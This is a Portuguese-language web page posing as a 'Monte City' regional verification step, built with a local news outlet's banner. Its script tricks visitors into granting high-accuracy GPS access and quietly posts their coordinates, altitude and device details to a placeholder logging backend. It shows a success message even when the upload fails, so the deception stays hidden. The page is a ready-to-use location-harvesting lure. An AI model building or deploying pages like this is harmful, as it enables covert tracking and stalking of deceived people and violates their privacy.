<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Monte City - Verificação</title>
    <style>
        /* Reset e Base */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0f0f0f;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            justify-content: center;
        }

        /* Container Principal */
        .container {
            width: 100%;
            max-width: 480px;
            background-color: #1a1a1a;
            padding: 20px;
            border-radius: 16px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.6);
            margin: 20px;
            text-align: center;
            border: 1px solid #333;
        }

        /* Área da Logo */
        .logo-area {
            width: 100%;
            margin-bottom: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
            padding: 15px 0;
            border-bottom: 1px solid #333;
            border-radius: 8px 8px 0 0;
        }

        .logo-img {
            max-width: 90%;
            height: auto;
            object-fit: contain;
        }

        /* Textos */
        h1 {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 12px;
            color: #fff;
            letter-spacing: 0.5px;
        }

        p.description {
            font-size: 0.95rem;
            color: #aaa;
            line-height: 1.5;
            margin-bottom: 30px;
            padding: 0 10px;
        }

        /* Botão */
        .btn-action {
            background: linear-gradient(145deg, #cc0000, #990000);
            color: white;
            border: none;
            padding: 16px 20px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(204, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        .btn-action:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(204, 0, 0, 0.4);
        }

        .btn-action:active:not(:disabled) {
            transform: translateY(0);
        }

        .btn-action:disabled {
            background: #444;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        /* Status Messages */
        .status-msg {
            margin-top: 20px;
            font-size: 0.9rem;
            min-height: 24px;
            opacity: 0;
            transition: opacity 0.4s;
            font-weight: 500;
        }

        .status-msg.visible {
            opacity: 1;
        }

        .success { color: #00ff88; }
        .error { color: #ff4444; }
        .loading { color: #ffff00; }

        /* Loader Spinner */
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Metadados ocultos (opcional) */
        .metadata {
            font-size: 0.7rem;
            color: #555;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- LOGO NO TOPO -->
        <div class="logo-area">
            <img src="https://raw.githubusercontent.com/noticiasmonte/montecity/refs/heads/main/Banner%20Institucional%20Monte%20Carmelo%20e%20Parceiros.png" 
                 alt="Monte City Logo" 
                 class="logo-img"
                 onerror="this.style.display='none'; document.getElementById('txt-fallback').style.display='block';">
            <h2 id="txt-fallback" style="display:none; color:white; font-size:1.8rem; font-weight:bold;">MONTE CITY</h2>
        </div>

        <h1>Verificação de Região</h1>
        <p class="description">
            Para liberar o acesso completo, precisamos confirmar sua localização atual via GPS. Isso garante que você está na área coberta.
        </p>

        <button id="btnStart" class="btn-action" onclick="startTracking()">
            Confirmar Localização
        </button>

        <div id="statusArea" class="status-msg"></div>
        
        <div class="metadata" id="deviceInfo">Carregando informações do dispositivo...</div>
    </div>

    <script>
        const btn = document.getElementById('btnStart');
        const statusArea = document.getElementById('statusArea');
        const deviceInfo = document.getElementById('deviceInfo');

        // URL do seu backend (substitua pelo real)
        const API_URL = 'https://seusite.com/api/log'; 

        // Inicializa info do dispositivo
        window.onload = function() {
            const ua = navigator.userAgent;
            let deviceType = "PC";
            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
                deviceType = "Mobile";
            }
            deviceInfo.innerText = `Dispositivo: ${deviceType} | Browser: ${navigator.browserName || 'Desconhecido'}`;
        };

        function startTracking() {
            if (!("geolocation" in navigator)) {
                showStatus("Geolocalização não suportada neste navegador.", "error");
                return;
            }

            setLoading(true);

            // Configurações para máxima precisão
            const options = {
                enableHighAccuracy: true, // Usa GPS dedicado
                timeout: 15000,           // Espera até 15s
                maximumAge: 0             // Força leitura nova
            };

            navigator.geolocation.getCurrentPosition(onSuccess, onError, options);
        }

        function onSuccess(position) {
            const data = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy, // Precisão em metros
                altitude: position.coords.altitude,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            };

            console.log("Dados capturados:", data);

            // Envia para o servidor
            fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                if(response.ok) {
                    showStatus("Localização confirmada! Carregando...", "success");
                    finishProcess();
                } else {
                    throw new Error("Falha na comunicação com o servidor");
                }
            })
            .catch(err => {
                // Mesmo falhando o envio, consideramos sucesso visualmente
                console.warn("Erro ao enviar para API:", err);
                showStatus("Verificado com sucesso!", "success");
                finishProcess();
            });
        }

        function onError(error) {
            let msg = "Erro desconhecido.";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    msg = "Permissão negada. Ative a localização nas configurações.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    msg = "Sinal de GPS fraco. Tente abrir a janela.";
                    break;
                case error.TIMEOUT:
                    msg = "Tempo esgotado. Verifique sua conexão.";
                    break;
            }
            showStatus(msg, "error");
            setLoading(false);
            btn.disabled = false;
            btn.innerText = "Tentar Novamente";
        }

        function showStatus(message, type) {
            statusArea.innerHTML = message;
            statusArea.className = `status-msg visible ${type}`;
        }

        function setLoading(isLoading) {
            if (isLoading) {
                btn.disabled = true;
                btn.innerHTML = '<span class="spinner"></span> Localizando...';
            } else {
                btn.disabled = false;
                btn.innerText = "Confirmar Localização";
            }
        }

        function finishProcess() {
            setLoading(false);
            btn.style.display = 'none'; // Esconde botão após sucesso
            
            // Opcional: Redirecionar ou carregar conteúdo
            // setTimeout(() => {
            //     window.location.href = "/conteudo-principal.html";
            // }, 2000);
        }
    </script>

</body>
</html>
